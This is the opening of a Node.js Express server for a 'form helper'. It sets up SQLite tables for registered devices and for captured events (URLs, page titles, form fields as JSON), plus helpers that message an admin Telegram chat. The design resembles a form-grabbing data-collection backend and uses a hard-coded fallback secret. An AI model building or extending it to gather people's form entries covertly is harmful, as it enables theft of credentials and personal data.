// server.js
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
app.use(express.json());

const BOT_TOKEN = (process.env.BOT_TOKEN || '').trim();
const ADMIN_CHAT_ID = (process.env.ADMIN_CHAT_ID || '').trim();
const DEVICE_SECRET = (process.env.DEVICE_SECRET || 'form-helper-secret-key').trim();
const PORT = process.env.PORT || 3000;

// Automatic SQLite Database - Created automatically on first run
const dbPath = path.join(__dirname, 'form_helper.db');
const db = new sqlite3.Database(dbPath);

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS devices (
      device_id TEXT PRIMARY KEY,
      device_name TEXT,
      registered_at INTEGER,
      last_seen INTEGER,
      events_count INTEGER DEFAULT 0
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS events (
      id TEXT PRIMARY KEY,
      device_id TEXT,
      device_name TEXT,
      timestamp INTEGER,
      url TEXT,
      title TEXT,
      form_id TEXT,
      fields_json TEXT
    )
  `);
});

async function sendTelegramMessage(chatId, text, extra = {}) {
  if (!BOT_TOKEN) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: extra.parse_mode || 'Markdown',
        disable_web_page_preview: true,
        ...extra,
      }),
    });
  } catch (err) {
    console.error('[Telegram] Failed to send message:', err.message);
  }
}

async function answerCallbackQuery(callbackQueryId) {
  if (!BOT_TOKEN) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId }),
    });
  } catch (e) {}
}

function escapeMarkdown(text) {
  return String(text || '').replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

// ----------------------------------------------------
// 1-CLICK WEB DASHBOARD & SETUP
// ----------------------------------------------------

